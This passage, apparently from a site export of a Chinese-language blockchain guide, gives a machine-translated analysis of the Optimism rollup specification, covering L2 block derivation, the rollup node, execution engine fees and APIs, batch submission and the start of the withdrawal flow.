链派生的最后一个块）的时间戳之后，批次就会被推送到下一阶段。该批次的父哈希也必须与当前安全 L2 头的哈希相匹配。\n请注意，从 L1 派生的批次中存在任何间隙意味着该阶段需要缓冲整个 测序窗口，然后才能生成空批次（因为丢失的批次可能在最后一个 L1 块中包含数据）最坏情况下的窗口）。\n一个批次可以有 4 种不同形式的有效性：\n\ndrop：该批次无效，并且将来一直如此，除非我们重新组织。可以将其从缓冲区中删除。\naccept：该批次有效，应进行处理。\nundecided：在我们可以进行批量过滤之前，我们缺乏 L1 信息。\nfuture：该批次可能有效，但尚无法处理，应稍后再次检查。\n\n批次按照包含在 L1 上的顺序进行处理：如果可以进行多个批次，accept则应用第一个批次。实现可以推迟future批次稍后的推导步骤以减少验证工作。\n批次有效性计算如下：\n定义：\n\nbatch如批处理格式部分中所定义。\nepoch = safe_l2_head.l1_origin与批次耦合的 L1 源，具有以下属性： number（L1 块编号）、hash（L1 块哈希）和timestamp（L1 块时间戳）。\ninclusion_block_number``batch是第一次完全推导时的L1块号，即由前一级解码和输出时的L1块号。\nnext_timestamp = safe_l2_head.timestamp + block_time是下一批应该具有的预期 L2 时间戳，请参阅块时间信息。\nnext_epoch可能还不知道，但epoch如果可用的话将是 L1 块。\nbatch_origin是 或epoch，next_epoch取决于验证。\n\n请注意，批次的处理可以推迟到batch.timestamp &lt;= next_timestamp，因为future无论如何都必须保留批次。\n规则，按验证顺序：\n\n\nbatch.timestamp &gt; next_timestamp→ future：即批次必须准备好处理。\n\n\nbatch.timestamp &lt; next_timestamp→ drop：即批次不能太旧。\n\n\nbatch.parent_hash != safe_l2_head.hash→ drop：即父哈希必须等于L2安全头块哈希。\n\n\nbatch.epoch_num + sequence_window_size &lt; inclusion_block_number→ drop：即该批次必须及时包含。\n\n\nbatch.epoch_num &lt; epoch.number→ drop：即批次来源不早于L2安全头的来源。\n\n\nbatch.epoch_num == epoch.number: 定义batch_origin为epoch.\n\n\nbatch.epoch_num == epoch.number+1\n\n：\n\n如果next_epoch未知 → undecided：即在我们拥有 L1 原始数据之前，无法处理更改 L1 原点的批次。\n如果已知，则定义batch_origin为next_epoch\n\n\n\nbatch.epoch_num &gt; epoch.number+1→ drop：即每个 L2 块的 L1 原点不能更改超过一个 L1 块。\n\n\nbatch.epoch_hash != batch_origin.hash→ drop：即批次必须引用规范的 L1 来源，以防止批次被重播到意外的 L1 链上。\n\n\nbatch.timestamp &lt; batch_origin.time→ drop：强制执行最小 L2 时间戳规则。\n\n\nbatch.timestamp &gt; batch_origin.time + max_sequencer_drift\n\n：强制执行 L2 时间戳漂移规则，但有例外情况以保留高于最小 L2 时间戳不变性：\n\n\nlen(batch.transactions) == 0\n\n：\n\n\nepoch.number == batch.epoch_num\n\n：这意味着该批次尚未提前至 L1 原点，因此必须对照 进行检查\nnext_epoch\n\n。\n\n如果next_epoch未知 → undecided：如果没有下一个 L1 原点，我们还无法确定是否可以保持时间不变。\n如果batch.timestamp &gt;= next_epoch.time→ drop：批次可以采用下一个 L1 原点而不破坏L2 time &gt;= L1 time不变量。\n\n\n\n\n\nlen(batch.transactions) &gt; 0: → drop: 当超过定序器时间漂移时，绝不允许定序器包含事务。\n\n\n\n\nbatch.transactions\n\n：\ndrop\n\n如果\nbatch.transactions\n\n列表中包含无效交易或仅通过其他方式衍生的交易：\n\n任何空交易（零长度字节字符串）\n任何存入的交易（由交易类型前缀字节标识）\n\n\n\n如果没有批次可以被accept-ed，并且该阶段已完成可以从高度为 L1 块完全读取的所有批次的缓冲epoch.number + sequence_window_size，并且next_epoch可用，则可以派生出具有以下属性的空批次：\n\n\nparent_hash = safe_l2_head.hash\n\n\ntimestamp = next_timestamp\n\n\ntransactions为空，即没有定序器事务。存入交易可能会在下一阶段添加。\n\n\n如果\nnext_timestamp &lt; next_epoch.time\n\n：重复当前的 L1 原点，以保持 L2 时间不变。\n\nepoch_num = epoch.number\nepoch_hash = epoch.hash\n\n\n\n如果批次是纪元的第一批，则使用该纪元而不是推进纪元，以确保每个纪元至少有一个 L2 块。\n\nepoch_num = epoch.number\nepoch_hash = epoch.hash\n\n\n\n否则，\n\nepoch_num = next_epoch.number\nepoch_hash = next_epoch.hash\n\n\n\n负载属性推导\n在有效负载属性导出阶段，我们将从前一阶段获得的批次转换为结构的实例PayloadAttributes。这种结构对需要放入区块的交易以及其他区块输入（时间戳、费用接收者等）进行编码。有效负载属性派生在下面的派生有效负载属性部分中详细介绍。\n该阶段维护自己的系统配置副本，独立于 L1 检索阶段。每当批量输入引用的 L1 纪元发生变化时，系统配置就会使用 L1 日志事件进行更新。\n引擎队列\n在引擎队列阶段，先前导出的PayloadAttributes结构被缓冲并发送到 执行引擎执行并转换为适当的L2块。\n该阶段维护对三个 L2 块的引用：\n\n最终确定的 L2 头：直到并包括该块的所有内容都可以完全源自 L1 链的最终确定（即规范且永远不可逆）部分。\n安全的 L2 头：直到并包括该块的所有内容都可以完全源自当前规范的 L1 链。\n不安全的L2头：安全头和不安全头之间的块是不是从L1派生的不安全块。这些块要么来自排序（在定序器模式下），要么来自与定序器的不安全同步（在验证器模式下）。这也称为“最新”头。\n\n此外，它还缓冲最近处理的安全 L2 块的引用的简短历史记录，以及每个 L1 块派生的引用。该历史不必是完整的，但可以使以后的 L1 最终信号能够转换为 L2 最终信号。\n引擎API使用\n为了与引擎交互，使用执行引擎 API ，通过以下 JSON-RPC 方法：\n\nengine_forkchoiceUpdatedV1— 如果不同，则更新 forkchoice（即链头）headBlockHash，如果有效负载属性参数不是，则指示引擎开始构建执行有效负载null。\nengine_getPayloadV1— 检索先前请求的执行负载构建。\nengine_newPayloadV1— 执行执行负载来创建块。\n\n执行有效负载是类型的对象ExecutionPayloadV1。\nForkchoice同步\n如果在派生或处理其他输入之前要应用任何 forkchoice 更新，那么这些更新将首先应用于引擎。\n这种同步可能会在以下情况下发生：\n\nL1 最终信号最终确定一个或多个 L2 块：更新“最终确定”的 L2 块。\n成功整合不安全的 L2 块：更新“安全”L2 块。\n派生管道重置后的第一件事是确保执行引擎 forkchoice 状态一致。\n\n新的 forkchoice 状态通过 来应用engine_forkchoiceUpdatedV1。在出现 forkchoice-state 有效性错误时，必须重置派生管道以恢复到一致状态。\nL1-consolidation：负载属性匹配\n如果不安全头位于安全头之前，则尝试合并，验证现有不安全 L2 链是否与从规范 L1 数据导出的导出 L2 输入相匹配。\n在合并期间，我们考虑最旧的不安全L2块，即紧接在安全头之后的不安全L2块。如果有效负载属性与这个最旧的不安全 L2 块匹配，则该块可以被视为“安全”并成为新的安全头。\n检查导出的 L2 有效负载属性的以下字段是否与 L2 块相等：\n\nparent_hash\ntimestamp\nrandao\nfee_recipient\ntransactions_list（首先是长度，然后是每个编码交易的相等性，包括存款）\n\n如果合并成功，forkchoice 更改将按照上一节所述进行同步。\n如果合并失败，将立即处理 L2 有效负载属性，如下节所述。有效负载属性的选择有利于先前不安全的 L2 区块，从而在当前安全区块之上创建 L2 链重组。立即处理新的替代属性使像 go-ethereum 这样的执行引擎能够实施更改，因为可能不支持链末端的线性倒带。\nL1-sync：有效负载属性处理\n如果安全和不安全的 L2 头相同（无论是否由于合并失败），我们将 L2 有效负载属性发送到执行引擎以构造成正确的 L2 块。这个 L2 块将成为新的 L2 安全头和不安全头。\n如果由于验证错误（即块中存在无效交易或状态转换）而无法将从批次创建的有效负载属性插入到链中，则应删除该批次并且不应提前安全头。引擎队列将尝试使用批次队列中该时间戳的下一个批次。如果未找到有效批次，则汇总节点将创建仅存款批次，该批次应始终通过验证，因为存款始终有效。\n与执行引擎通信部分详细介绍了通过执行引擎 API 与执行引擎进行交互。\n然后使用以下序列处理有效负载属性：\n\n\nengine_forkchoiceUpdatedV1\n\n具有当前阶段的 forkchoice 状态，以及开始块构建的属性。\n\n必须禁用非确定性来源（例如交易池）才能重建预期的块。\n\n\n\nengine_getPayload通过上一步结果中的有效负载 ID 检索有效负载。\n\n\nengine_newPayload将新的有效负载导入到执行引擎中。\n\n\nengine_forkchoiceUpdatedV1为了使新的有效负载规范化，现在更改了safe和unsafe字段以引用有效负载，并且没有有效负载属性。\n\n\n引擎API错误处理：\n\n对于 RPC 类型错误，应在以后的步骤中重新尝试有效负载属性处理。\n在有效负载处理错误时，必须删除属性，并且必须保持 forkchoice 状态不变。\n\n最终，派生管道将产生替代的有效负载属性，无论是否有批次。\n如果有效负载属性仅包含存款，那么如果这些属性无效，则这是一个严重的推导错误。\n\n\n在出现 forkchoice-state 有效性错误时，必须重置派生管道以恢复到一致状态。\n\n处理不安全的有效负载属性\n如果没有分叉选择更新或 L1 数据需要处理，并且如果下一个可能的 L2 块已经可以通过不安全的来源（例如通过 p2p 网络发布的定序器）获得，那么它会被乐观地处理为“不安全”块。这将后续的推导工作减少到在满意的情况下仅与 L1 合并，并且使用户能够比 L1 确认 L2 批次更快地看到 L2 链的头部。\n要处理不安全的有效负载，有效负载必须：\n\n具有比当前安全L2头更高的块号。\n\n安全的 L2 头只能因 L1 重组而被重组。\n\n\n有一个与当前不安全的 L2 头匹配的父块哈希。\n\n这可以防止执行引擎单独同步不安全的 L2 链中的较大间隙。\n这可以防止不安全的 L2 块重组其他先前验证的 L2 块。\n此检查可能会在未来版本中更改以采用例如 L1 快照同步协议。\n\n\n\n然后通过以下序列处理有效负载：\n\nengine_newPayloadV1：处理有效负载。它还没有成为规范。\nengine_forkchoiceUpdatedV1：将有效负载设置为规范的不安全L2头，并保留安全/最终确定的L2头。\n\n引擎API错误处理：\n\n对于 RPC 类型的错误，应在以后的步骤中重新尝试有效负载处理。\n当有效负载处理错误时，必须删除有效负载，并且不能将其标记为规范。\n在出现 forkchoice-state 有效性错误时，必须重置派生管道以恢复到一致状态。\n\n重置管道\n例如，如果我们检测到 L1重组（重组），则可以重置管道。 这使得汇总节点能够处理 L1 链重组事件。\n重置会将管道恢复到产生与完整 L2 推导过程相同的输出的状态，但从现有的 L2 链开始，向后遍历足以与当前的 L1 链协调。\n请注意，该算法涵盖了几个重要的用例：\n\n初始化管道而不从 0 开始，例如当汇总节点使用现有引擎实例重新启动时。\n如果管道与执行引擎链不一致（例如，当引擎同步/更改时），则恢复管道。\n当 L1 链重组时恢复管道，例如，较晚的 L1 块被孤立，或者更大的证明失败。\n初始化管道，以在防错程序内使用先前的 L1 和 L2 历史记录派生有争议的 L2 块。\n\n处理这些情况还意味着节点可以配置为通过 0 次确认立即同步 L1 数据，因为如果 L1 稍后将数据识别为规范数据，它可以撤消更改，从而实现安全的低延迟使用。\n首先重置引擎队列，以确定继续推导的 L1 和 L2 起点。此后，其他阶段彼此独立地重置。\n寻找同步起点\n要找到起点，相对于链头向后移动有几个步骤：\n\n\n查找当前L2 forkchoice状态\n\n如果找不到finalized区块，则从基岩创世区块开始。\n如果safe找不到块，则回退到该finalized块。\n该unsafe块应始终可用并与上述内容一致（在罕见的发动机损坏恢复情况下可能不会出现，这一点正在审查中）。\n\n\n\n找到第一个具有合理 L1 参考的 L2 块作为新的\nunsafe\n\n起点，从前一个 开始\nunsafe\n\n，回到\nfinalized\n\n，不再进一步。\n\n合理的 iff：L2 块的 L1 起源已知且规范，或者未知且块号领先于 L1。\n\n\n\n找到第一个 L2 块，其 L1 参考早于测序窗口，作为新的\nsafe\n\n起点，从上面看似合理的\nunsafe\n\n头部开始，返回到\nfinalized\n\n不再进一步。\n\n如果在任何时候 L1 起源已知但不规范，则unsafe头部将被修改为当前的父级。\n具有已知规范 L1 起源的最高 L2 块被记住为highest。\n如果在任何时候块中的 L1 原点破坏了推导规则，则会出错。腐败包括：\n\nL1 起源块编号或父哈希与父 L1 起源不一致\n0L1 序列号不一致（对于 L1 原点更改，始终更改为，1如果不是则递增）\n\n\n如果 L2 块的 L1 原点n比 的 L1 原点早highest超过一个序列窗口，并且n.sequence_number == 0，则 的父 L2 块n将是safe起始点。\n\n\n\nL2finalized块仍然作为finalized起点。\n\n\n查找 L1 引用早于通道超时的第一个 L2 块\n\n我们称之为该块引用的 L1 原点l2base将是baseL2 管道派生的源：通过从这里开始，各个阶段可以缓冲任何必要的数据，同时丢弃不完整的派生输出，直到 L1 遍历赶上实际的 L2 安全头。\n\n\n\n在遍历 L2 链时，实现可能会进行健全性检查，确保与现有的 forkchoice 状态相比，起点永远不会设置得太远，以避免由于配置错误而导致的密集重组。\n实施者注意：步骤 1-4 称为FindL2Heads。第 5 步当前是引擎队列重置的一部分。这可能会改变以将起点搜索与裸重置逻辑隔离。\n重置推导阶段\n\nL1 遍历：从 L1 开始，base作为下一阶段拉取的第一个块。\nL1 检索：清空之前的数据，并获取baseL1 数据，或者将获取工作推迟到稍后的管道步骤。\n帧队列：清空队列。\n通道库：清空通道库。\n通道读取器：重置任何批量解码状态。\n批处理队列：清空批处理队列，用作base初始 L1 参考点。\n有效负载属性推导：清空任何批次/属性状态。\n引擎队列：\n\n使用同步起始点状态初始化 L2 forkchoice 状态。( finalized// safe) unsafe_\n将平台的 L1 参考点初始化为base。\n需要将 forkchoice 更新作为第一个任务\n重置所有最终数据\n\n\n\n如有必要，从 开始的阶段base可以根据块中编码的数据初始化其系统配置l2base。\n关于合并后重组\n请注意，合并后，重组的深度将受到L1 最终确定延迟的限制 （2 个 L1 信标周期，或大约 13 分钟，除非超过 1/3 的网络始终不同意）。新的 L1 区块可能会在每个 L1 信标周期（大约 6.4 分钟）完成，并且根据这些最终信号和批量包含，派生的 L2 链也将变得不可逆转。\n请注意，这种形式的最终确定仅影响输入，然后节点可以通过从这些不可逆输入以及设置的协议规则和参数再现链来主观地认为该链是不可逆的。\n然而，这与 L1 上发布的输出完全无关，L1 需要诸如防错或 zk 证明之类的证明形式才能最终确定。像 L1 提款这样的乐观汇总输出只有在经过一周且没有争议（故障证明挑战窗口）后才会被标记为“最终确定”，这是与权益证明最终确定的名称冲突。\n\n派生有效负载属性\n对于从 L1 数据派生的每个 L2 块，我们需要构建有效负载属性，由对象的扩展版本表示PayloadAttributesV1，其中包括附加transactions和noTxPool字段。\n此过程发生在验证者节点运行的有效负载属性队列期间，以及排序器节点运行的块生产期间（如果交易是批量提交的，排序器可能会启用交易池使用）。\n导出交易列表\n对于定序器要创建的每个 L2 块，我们从与目标 L2 块编号匹配的定序器批次开始。如果 L1 链不包含目标 L2 区块编号的批次，则这可能是一个空的自动生成批次。请记住，该批次包括排序纪元号、L2 时间戳和事务列表。\n该块是测序 epoch的一部分，其编号与 L1 块的编号（其*L1 origin*）匹配。该 L1 区块用于派生 L1 属性和（对于该纪元中的第一个 L2 区块）用户存款。\n因此，一个PayloadAttributesV1对象必须包含以下事务：\n\n\n一笔或多笔\n存入交易\n，有两种：\n\n单一*L1属性存入交易*，源于L1本源。\n对于纪元中的第一个 L2 区块，零个或多个*用户存款交易*，源自L1 来源的收据。\n\n\n\n零个或多个*排序交易*：由 L2 用户签名的常规交易，包含在排序器批次中。\n\n\n事务必须按此顺序出现在有效负载属性中。\nL1 属性是从 L1 区块头读取的，而存款是从 L1 区块的收据中读取的。有关如何将存款编码为日志条目的详细信息，请参阅存款合约规范。\n构建单独的有效负载属性\n导出交易列表后，rollup 节点构造PayloadAttributesV1如下：\n\ntimestamp设置为批次的时间戳。\nrandom被设置为prev_randaoL1块属性。\nsuggestedFeeRecipient设置为 Sequencer Fee Vault 地址。请参阅费用库规范。\ntransactions是派生交易的数组：存款交易和排序交易，全部用EIP-2718编码。\nnoTxPool设置为，以在构造块时true使用上面的列表。transactions\ngasLimit设置为此负载的系统配置gasLimit中的当前值。\n"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-rollupnode":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-rollupnode","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism spec分析/op-rollupnode.md","title":"op-rollupnode","links":[],"tags":[],"content":"汇总节点规范\nRollup 节点是负责从 L1 区块（及其关联的收据）派生 L2 链的组件。\nRollup 节点中派生 L2 链的部分称为rollup 驱动程序。本文档目前仅涉及 rollup 驱动程序的规范。\n目录\n\n司机\n\n推导\n\n\nL2输出RPC方法\n\n输出方法API\n\n\n\n司机\nRollup 节点中的driver的任务 是管理派生过程：\n\n跟踪 L1 头块\n跟踪L2链同步进度\n当新输入可用时迭代推导步骤\n\n推导\n此过程分三个步骤进行：\n\n从最后一个 L2 区块顶部的 L1 链中选择输入：区块列表，包含交易以及相关数据和收据。\n读取 L1 信息、存款和排序批次，以生成有效负载属性 （本质上是没有输出属性的块）。\n将有效负载属性传递给执行引擎，以便可以计算L2块（包括输出块属性）。\n\n虽然这个过程在概念上是从 L1 链到 L2 链的纯函数，但实际上是增量的。每当新的 L1 块添加到 L1 链时，L2 链就会扩展。类似地，每当 L1 链重新组织时，L2 链也会重新组织。\n有关 L2 块推导的完整规范，请参阅L2 块推导文档。\nL2输出RPC方法\nRollup 节点有自己的 RPC 方法，optimism_outputAtBlock该方法返回与L2 输出 root对应的 32 字节哈希。\n输出方法API\n这里的输入和返回类型是由引擎 API 规范定义的）。\n\n方法：optimism_outputAtBlock\n参数：\n\nblockNumber: QUANTITY, 64 位 - L2 整数块号\nOR - 、、 或String之一。&quot;safe&quot;``&quot;latest&quot;``&quot;pending&quot;\n\n\n返回：\n\nversion: DATA, 32 字节 - 输出根版本号，从 0 开始。\nl2OutputRoot: DATA, 32 字节 - 输出根。\n\n\n"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-执行引擎":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-执行引擎","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism spec分析/op-执行引擎.md","title":"op-执行引擎","links":[],"tags":[],"content":"L2执行引擎\n目录\n\n存入交易处理\n\n存入交易边界\n\n\n费用\n\n费用金库\n优先费（Sequencer Fee Vault）\n基本费用（基本费用保险库）\nL1-成本费（L1 Fee Vault）\n\n\n引擎API\n\nengine_forkchoiceUpdatedV1\n\n扩展有效负载属性V1\n\n\nengine_newPayloadV1\nengine_getPayloadV1\n\n\n联网\n同步\n\n快乐路径同步\n最坏情况同步\n\n\n\n本文档概述了 L2 的 L1 执行引擎的修改、配置和使用。\n存入交易处理\n引擎接口使用EIP-2718抽象出事务类型。\n为了支持汇总功能，新存款的处理TransactionType 由引擎实现，请参阅存款规范。\n此类交易可以铸造L2 ETH，运行EVM，并在执行状态将L1信息引入到铭记的合约中。\n存入交易边界\n交易不能盲目信任，信任是通过身份验证建立的。与其他交易类型不同，存款不通过签名进行身份验证：汇总节点在引擎外部对它们进行身份验证。\n为了安全地处理存款交易，必须首先对存款进行身份验证：\n\n通过可信引擎 API 直接摄取\n部分同步到受信任的块哈希（通过之前的引擎 API 指令受信任）\n\n存入的交易绝不能从交易池中消耗。 可以在仅存款汇总中禁用交易池\n费用\n顺序交易（即不适用于存款）收取 3 种费用：优先费、基本费和 L1 成本费。\n费用金库\n出于会计目的，这三种类型的费用在 3 个不同的 L2 费用库部署中收集：费用支付不会注册为内部 EVM 调用，因此通过这种方式可以更好地区分。\n这些是硬编码地址，指向预先部署的代理合约。这些代理由金库合约部署支持，基于FeeVault，将金库资金安全地路由到 L1。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n仓库名称预部署定序器费用库SequencerFeeVault基本费用金库BaseFeeVaultL1 费用金库L1FeeVault\n优先费（Sequencer Fee Vault）\n优先费遵循eip-1559规范，由 L2 区块的费用接收方收取。区块费用接收者（又名 coinbase 地址）设置为 Sequencer Fee Vault 地址。\n基本费用（基本费用保险库）\n基本费用很大程度上遵循eip-1559规范，但基本费用不会被销毁，而是会累加到基本费用 Vault ETH 账户余额中。\nL1-成本费（L1 Fee Vault）\n该协议通过根据估计的批量提交成本向 L2 用户收取额外费用，为排序的 L2 交易的批量提交提供资金。该费用从 L2 交易发送者 ETH 余额中收取，并收集到 L1 费用库中。\n用于确定 L2 交易的 L1 成本费用部分的确切 L1 成本函数计算如下： (rollupDataGas + l1FeeOverhead) * l1Basefee * l1FeeScalar / 1000000 （big-int 计算，结果以 Wei 和uint256范围表示）其中：\n\n\nrollupDataGas\n\n由完整\n编码交易确定（标准 EIP-2718 交易编码，包括签名字段）：\n\n\n在 Regolith 分叉之前：\nrollupDataGas = zeroes * 4 + (ones + 68) * 16\n\n\n68非零字节的添加是 Bedrock 之前的 L1 成本核算功能的残余，它考虑了最坏情况的非零字节添加以补充未签名的交易，与 Bedrock 不同。\n\n\n\n使用 Regolith 叉子：rollupDataGas = zeroes * 4 + ones * 16\n\n\n\n\nl1FeeOverhead是 Gas Price Oracleoverhead值。\n\n\nl1FeeScalar是 Gas Price Oraclescalar值。\n\n\nl1Basefee是在L2链上注册的最新L1源的L1基本费用。\n\n\n请注意，它使用与eip-2028rollupDataGas中定义的相同的字节成本核算，但完整的 L2 事务现在计入 L1 呼叫数据中收取的字节数。此行为与 Bedrock 之前对 L2 交易的 L1 成本估计相匹配。\noverhead批量交易的压缩、批量和内在 Gas 成本由具有 Gas Price Oracle和参数的协议计算scalar。\nGas Price Oraclel1FeeOverhead和l1FeeScalar以及l1BasefeeL1 来源的 可以通过两种可互换的方式访问：\n\n\n从当前 L2 块的存放的 L1 属性 ( l1FeeOverhead, l1FeeScalar, ) 中读取basefee\n\n\n从 L1 区块信息合约中读取 (\n0x4200000000000000000000000000000000000015\n\n)\n\n使用相应的 Solidity uint256-getter 函数 ( l1FeeOverhead, l1FeeScalar, basefee)\n使用直接存储读取：\n\nuint256L1 基本费用作为槽中的大尾数法1\nuint256槽中作为大端的开销5\nuint256标量作为槽中的大尾数法6\n\n\n\n\n\n引擎API\nengine_forkchoiceUpdatedV1\n这会更新引擎认为规范的 L2 块（forkchoiceState参数），并可选择启动块生成（payloadAttributes参数）。\n在汇总中，forkchoice 更新的类型转换为：\n\nheadBlockHash：规范链头部的区块哈希。在用户 JSON-RPC 中标记&quot;unsafe&quot;。节点可以提前在带外应用 L2 块，然后在 L1 数据冲突时重新组织。\nsafeBlockHash：规范链的区块哈希，源自L1数据，不太可能重组。\nfinalizedBlockHash：不可逆的区块哈希，匹配争议期的下边界。\n\n为了支持汇总功能，引入了一项向后兼容的更改engine_forkchoiceUpdatedV1：扩展PayloadAttributesV1\n扩展有效负载属性V1\nPayloadAttributesV1扩展为：\nPayloadAttributesV1: {\n    timestamp: QUANTITY\n    random: DATA (32 bytes)\n    suggestedFeeRecipient: DATA (20 bytes)\n    transactions: array of DATA\n    noTxPool: bool\n    gasLimit: QUANTITY or null\n}\n\n这里使用的类型表示法是指以太坊 JSON-RPC API 规范使用的十六进制值编码，因为该结构需要通过 JSON-RPC 发送。指的是 JSON 数组。array\n数组的每一项transactions都是编码交易的字节列表：TransactionType || TransactionPayload或LegacyTransaction，如EIP-2718中定义。这相当于transactions中的字段ExecutionPayloadV1\n该transactions字段是可选的：\n\n如果为空或缺失：引擎行为不会发生变化。排序器（如果启用）将通过消耗交易池中的交易来构建区块。\n如果存在且非空：必须从这个确切的事务列表开始生成有效负载。Rollup 驱动程序根据确定性 L1 输入确定事务列表。\n\n也是noTxPool可选的，并扩展了transactions含义：\n\n如果false，执行引擎可以在任何transactions. 这是 L1 节点实现的默认行为。\n如果true，则执行引擎不得更改有关给定列表的任何内容transactions。\n\n如果该transactions字段存在，引擎必须按顺序执行事务，STATUS_INVALID 如果处理事务出错则返回。STATUS_VALID如果所有事务都可以无错误地执行，则它必须返回。注意：状态转换规则已修改，存款永远不会失败，因此如果engine_forkchoiceUpdatedV1返回STATUS_INVALID，则说明批量交易无效。\ngasLimit与 L1 的兼容性是可选的，但在用作汇总时是必需的。该字段覆盖块构建期间使用的气体限制。如果未指定为汇总，STATUS_INVALID则返回 a。\nengine_newPayloadV1\n没有对engine_newPayloadV1. 将 L2 块应用于发动机状态。\nengine_getPayloadV1\n没有对engine_getPayloadV1. 按 ID 检索有效负载，由engine_forkchoiceUpdatedV1调用时准备payloadAttributes。\n联网\n执行引擎可以通过rollup节点获取所有数据，正如源自L1： P2P网络是严格可选的。\n然而，为了不成为 L1 数据检索速度的瓶颈，应该启用 P2P 网络功能，服务于：\n\n\n对等发现（光盘 v5）\n\n\neth/66\n：\n\n交易池（由排序器节点消耗）\n状态同步（快速无信任数据库复制的快乐路径）\n历史区块头和区块体检索\n新区块通过共识层获取（rollup 节点）\n\n\n\n除了配置之外，无需修改 L1 网络功能：\n\nnetworkID：区分 L2 网络与 L1 和测试网。等于chainIDrollup 网络的 。\n激活合并分叉：启用引擎 API 并禁用块的传播，因为没有共识层就无法对块头进行身份验证。\nBootnode列表：DiscV5是共享网络， 通过先连接L2节点引导速度更快。\n\n同步\n执行引擎可以通过不同的方式操作同步：\n\nHappy-path：rollup节点将L1确定的所需链头告知引擎，通过引擎P2P完成。\n最坏情况：汇总节点检测到停滞的引擎，纯粹从 L1 数据完成同步，不需要对等点。\n\nhappy-path 更适合让新节点快速上线，因为引擎实现可以通过snap-sync等方法更快地同步状态。\n快乐路径同步\n\nrollup 节点无条件地通知 L2 链头的引擎（常规节点操作的一部分）：\n\nengine_newPayloadV1使用从 L1 派生的最新 L2 块进行调用。\nengine_forkchoiceUpdatedV1// 使用当前L2 块哈希unsafe值进行调用 。safe``finalized\n\n\n引擎向同级请求标头，反向请求直到父哈希与本地链匹配\n引擎赶上：a）一种形式的状态同步被激活以实现最终或头块哈希b）一种形式的块同步将块体和进程拉向头块哈希\n\n精确的基于 P2P 的同步超出了 L2 规范的范围：引擎内的操作与 L1 完全相同（尽管使用支持存款的 EVM）。\n最坏情况同步\n\n引擎不同步、未对等和/或由于其他原因而停止。\n汇总节点维护来自引擎的最新头（轮询eth_getBlockByNumber和/或维护头订阅）\n如果引擎不同步但未通过 P2P 同步，则汇总节点会激活同步 ( eth_syncing)\nRollup 节点逐一插入从 L1 派生的块，可能适应 L1 重组，如Rollup 节点规范中所述( engine_forkchoiceUpdatedV1, engine_newPayloadV1)\n"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-批量提交":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-批量提交","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism spec分析/op-批量提交.md","title":"op-批量提交","links":[],"tags":[],"content":"批量提交者\n批次提交者，也称为批处理者，是将 L2 排序器数据提交到 L1 的实体，以使其可供验证者使用。\n数据事务的格式在派生规范中定义：数据以与从数据派生到 L2 块相反的顺序从 L2 块构造。\n时间、操作和交易签名是特定于实现的：任何数据都可以随时提交，但从验证者的角度来看，只有符合派生规范规则的数据才是有效的。\n最小的批处理程序实现可以定义为以下操作的循环：\n\n查看unsafeL2区块号是否超过safe区块号：unsafe需要提交数据。\n迭代所有不安全的 L2 块，跳过之前提交的任何块。\n打开一个通道，缓冲所有要提交的 L2 块数据，同时应用派生规范中定义的编码和压缩。\n从通道中拉出帧来填充数据事务，直到通道为空。\n将数据交易提交到L1\n\n安全/不安全的 L2 视图不会在数据提交后立即更新，也不会在 L1 上确认时立即更新，因此可能需要特别注意不要重复数据提交。"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-提款":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-提款","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism spec分析/op-提款.md","title":"op-提款","links":[],"tags":[],"content":"提款\n提款是跨域交易，在 L2 上发起，并由在 L1 上执行的交易完成。值得注意的是，L2 账户可以使用提款来调用 L1 合约，或者将 ETH 从 L2 账户转移到 L1 账户。\n词汇注释：提现可以指交易过程中各个阶段的交易，但我们引入更具体的术语来区分：\n\n提款发起交易特指 L2 上发送到提款预部署的交易。\n提现证明交易特指证明提现正确（已包含在根在L1上的merkle树中）的L1交易。\n提现完成交易特指完成并中继提现的L1交易。\n\n提款是通过调用 Message Passer 预部署合约在 L2 上发起的，该合约在其存储中记录了消息的重要属性。通过调用 来在 L1 上证明提款OptimismPortal，这证明包含此提款消息。提款是通过调用合约在 L1 上完成的OptimismPortal，该合约验证自提款消息被证明以来故障挑战期已经过去。\n这样，提款与存款不同，存款在执行引擎客户端中使用特殊的交易类型 。相反，提款交易必须使用 L1 上的智能合约来完成。\n目录\n\n提现流程\n\n在 L2 上\n位于 L1\n\n\nL2ToL1MessagePasser 合约\n\n提款时地址不会使用别名\n\n\n乐观门户合约\n提款验证和最终确定\n安全考虑\n\n提款验证的关键属性\n处理已成功验证但中继失败的消息\n\n\n\n提现流程\n我们首先描述发起和完成提款的端到端流程：\n在 L2 上\nL2 账户向L2ToL1MessagePasser预部署合约发送一条提款消息（也可能是 ETH）。这是一个非常简单的合约，存储提款数据的哈希值。\n位于 L1\n\n中继者提交提款证明交易以及合约所需的输入OptimismPortal。中继者不一定是在 L2 上发起撤回的同一实体。这些输入包括提款交易数据、包含证明和区块号。区块号必须是存在 L2 输出根的区块号，该根号承诺在 L2 上注册的提款。\n合约从的 函数OptimismPortal中检索给定块号的输出根，并在内部执行其余的验证过程。L2OutputOracle``getL2Output()\n如果证明验证失败，则调用恢复。否则，哈希值将被记录以防止其被重新证明。请注意，如果相应的输出根发生变化，则可以多次证明撤回。\n提现被证明后，进入 7 天的挑战期，让其他网络参与者有时间挑战相应输出根的完整性。\n一旦挑战期结束，中继者就会向 OptimismPortal合约提交提款完成交易。中继者不需要是在 L2 上发起提款的同一实体。\n合约OptimismPortal接收提现交易数据并验证提现是否已被证明并通过挑战期。\n如果不满足要求，呼叫将恢复。否则，呼叫将被转发，并记录哈希值以防止重播。\n\nL2ToL1MessagePasser 合约\n通过调用 L2ToL1MessagePasser 合约的函数来发起提款initiateWithdrawal。L2ToL1MessagePasser 是一个简单的预部署合约，用于0x4200000000000000000000000000000000000016 存储要撤回的消息。\ninterface 